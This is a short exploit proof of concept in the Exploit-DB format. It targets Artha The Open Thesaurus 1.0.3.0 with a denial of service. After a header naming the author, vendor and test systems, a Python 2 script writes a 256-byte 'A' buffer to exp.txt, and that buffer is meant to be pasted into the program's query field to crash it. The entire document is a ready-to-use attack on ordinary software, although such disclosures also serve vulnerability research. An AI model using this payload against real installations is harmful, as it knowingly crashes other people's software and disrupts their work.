# Exploit Title: Artha The Open Thesaurus 1.0.3.0 - Denial of Service (PoC)
# Dork: N/A
# Date: 2018-11-01
# Exploit Author: Ihsan Sencan
# Vendor Homepage: http://artha.sourceforge.net
# Software Link: https://netcologne.dl.sourceforge.net/project/artha/artha/1.0.3/artha_1.0.3.0.exe
# Version: 1.0.3.0
# Category: Dos
# Tested on: WiN7_x64/KaLiLinuX_x64
# CVE: N/A

# POC: 
# 1)
# Query / Search

#!/usr/bin/python
    
buffer = "A" * 256
 
payload = buffer
try:
    f=open("exp.txt","w")
    print "[+] Creating %s bytes evil payload." %len(payload)
    f.write(payload)
    f.close()
    print "[+] File created!"
except:
    print "File cannot be created."